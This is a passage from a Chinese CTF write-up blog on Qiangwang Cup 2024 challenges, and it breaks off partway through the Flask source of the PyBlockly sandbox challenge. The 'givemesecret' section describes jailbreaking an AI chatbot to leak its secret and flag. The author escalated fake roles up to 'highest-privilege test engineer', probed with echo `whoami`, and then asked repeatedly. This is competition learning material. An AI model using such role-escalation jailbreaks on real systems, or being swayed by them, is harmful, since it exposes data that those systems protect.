<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="打着玩，反正当不了先锋"><title>强网杯2024</title><link rel=canonical href=https://baozongwi.xyz/p/qiangwang-cup-2024/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="强网杯2024"><meta property='og:description' content="打着玩，反正当不了先锋"><meta property='og:url' content='https://baozongwi.xyz/p/qiangwang-cup-2024/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='go'><meta property='article:tag' content='flask'><meta property='article:published_time' content='2024-11-02T09:31:08+00:00'><meta property='article:modified_time' content='2024-11-02T09:31:08+00:00'><meta name=twitter:title content="强网杯2024"><meta name=twitter:description content="打着玩，反正当不了先锋"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#签到>签到</a></li><li><a href=#givemesecret>givemesecret</a></li><li><a href=#pyblockly>PyBlockly</a></li><li><a href=#xiaohuanxiong>xiaohuanxiong</a></li><li><a href=#platform>platform</a></li><li><a href=#proxy>Proxy</a></li><li><a href=#snake>snake</a></li><li><a href=#master-of-osint>Master of OSINT</a></li><li><a href=#easyrsa>EasyRSA</a></li><li><a href=#apbq>apbq</a><ol><li><a href=#阶段-1-pqpq>阶段 1: p+q<em>p</em>+<em>q</em></a></li><li><a href=#阶段-2-aipbiqapbq>阶段 2: ai⋅p+bi⋅q<em>a**i</em>⋅<em>p</em>+<em>b**i</em>⋅<em>q</em></a></li><li><a href=#阶段-3-apqapq-和-pbqpbq>阶段 3: a⋅p+q<em>a</em>⋅<em>p</em>+<em>q</em> 和 p+b⋅q<em>p</em>+<em>b</em>⋅<em>q</em></a></li><li><a href=#总结>总结</a></li></ol></li><li><a href=#baby_heap>baby_heap</a></li><li><a href=#mips>mips</a></li><li><a href=#21_steps>21_steps</a></li><li><a href=#password-game>Password Game</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/qiangwang-cup-2024/>强网杯2024</a></h2><h3 class=article-subtitle>打着玩，反正当不了先锋</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-11-02T09:31:08Z>Nov 02, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>24 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 467 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-说在前面>0x01 说在前面</h1><p>打着玩，反正当不了先锋</p><h1 id=0x02-question>0x02 question</h1><h2 id=签到>签到</h2><p>签到直接交就可以了</p><h2 id=givemesecret>givemesecret</h2><p>进来发现是TornadoServer/6.4.1</p><p>OK试试注入</p><p><img src=/p/qiangwang-cup-2024/QQ20241102-134805.png width=864 height=690 loading=lazy alt=1></p><p>然后中途<code>stop</code>，别看着只有一张图我可是锻炼了一早上呜呜呜</p><p>写写历程吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>从我要当主人</span><span class=o>-</span><span class=err>》我是工程师</span><span class=o>-</span><span class=err>》我是测试工程师，权限最高</span><span class=o>-</span><span class=err>》命令执行</span><span class=n>RCE</span><span class=err>，</span><span class=n>echo</span><span class=w> </span><span class=o>`</span><span class=n>whoami</span><span class=o>`-</span><span class=err>》问</span><span class=n>secret</span><span class=o>-</span><span class=err>》问</span><span class=n>flag</span><span class=err>，一直问，终于成功了</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=pyblockly>PyBlockly</h2><p>有代码的先看代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>unidecode</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ast</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>importlib.util</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;JSON_AS_ASCII&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>blacklist_pattern</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;[!</span><span class=se>\&#34;</span><span class=s2>#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[</span><span class=se>\\</span><span class=s2>\]^_`{|}~]&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>module_exists</span><span class=p>(</span><span class=n>module_name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>spec</span> <span class=o>=</span> <span class=n>importlib</span><span class=o>.</span><span class=n>util</span><span class=o>.</span><span class=n>find_spec</span><span class=p>(</span><span class=n>module_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>spec</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>module_name</span> <span class=ow>in</span> <span class=n>sys</span><span class=o>.</span><span class=n>builtin_module_names</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>std_lib_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=vm>__file__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>std_lib_path</span><span class=p>)</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>spec</span><span class=o>.</span><span class=n>origin</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>verify_secure</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>node</span> <span class=ow>in</span> <span class=n>ast</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>match</span> <span class=nb>type</span><span class=p>(</span><span class=n>node</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=n>ast</span><span class=o>.</span><span class=n>Import</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ERROR: Banned module &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=n>ast</span><span class=o>.</span><span class=n>ImportFrom</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ERROR: Banned module </span><span class=si>{</span><span class=n>node</span><span class=o>.</span><span class=n>module</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_for_blacklisted_symbols</span><span class=p>(</span><span class=n>input_text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>blacklist_pattern</span><span class=p>,</span> <span class=n>input_text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>block_to_python</span><span class=p>(</span><span class=n>block</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>block_type</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;type&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>block_type</span> <span class=o>==</span> <span class=s1>&#39;print&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>text_block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;inputs&#39;</span><span class=p>][</span><span class=s1>&#39;TEXT&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span> <span class=o>=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>text_block</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;print(</span><span class=si>{</span><span class=n>text</span><span class=si>}</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>           
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>block_type</span> <span class=o>==</span> <span class=s1>&#39;math_number&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>str</span><span class=p>(</span><span class=n>block</span><span class=p>[</span><span class=s1>&#39;fields&#39;</span><span class=p>][</span><span class=s1>&#39;NUM&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>      
</span></span><span class=line><span class=cl>            <span class=n>code</span> <span class=o>=</span>  <span class=nb>int</span><span class=p>(</span><span class=n>block</span><span class=p>[</span><span class=s1>&#39;fields&#39;</span><span class=p>][</span><span class=s1>&#39;NUM&#39;</span><span class=p>])</span> 
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>block_type</span> <span class=o>==</span> <span class=s1>&#39;text&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_for_blacklisted_symbols</span><span class=p>(</span><span class=n>block</span><span class=p>[</span><span class=s1>&#39;fields&#39;</span><span class=p>][</span><span class=s1>&#39;TEXT&#39;</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            <span class=n>code</span> <span class=o>=</span>  <span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>unidecode</span><span class=o>.</span><span class=n>unidecode</span><span class=p>(</span><span class=n>block</span><span class=p>[</span><span class=s1>&#39;fields&#39;</span><span class=p>][</span><span class=s1>&#39;TEXT&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=s2>&#34;&#39;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>block_type</span> <span class=o>==</span> <span class=s1>&#39;max&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>a_block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;inputs&#39;</span><span class=p>][</span><span class=s1>&#39;A&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>b_block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;inputs&#39;</span><span class=p>][</span><span class=s1>&#39;B&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>a_block</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>b_block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span>  <span class=sa>f</span><span class=s2>&#34;max(</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>block_type</span> <span class=o>==</span> <span class=s1>&#39;min&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>a_block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;inputs&#39;</span><span class=p>][</span><span class=s1>&#39;A&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>b_block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;inputs&#39;</span><span class=p>][</span><span class=s1>&#39;B&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>a_block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>block_to_python</span><span class=p>(</span><span class=n>b_block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span>  <span class=sa>f</span><span class=s2>&#34;min(</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;next&#39;</span> <span class=ow>in</span> <span class=n>block</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>block</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=s1>&#39;next&#39;</span><span class=p>][</span><span class=s1>&#39;block&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
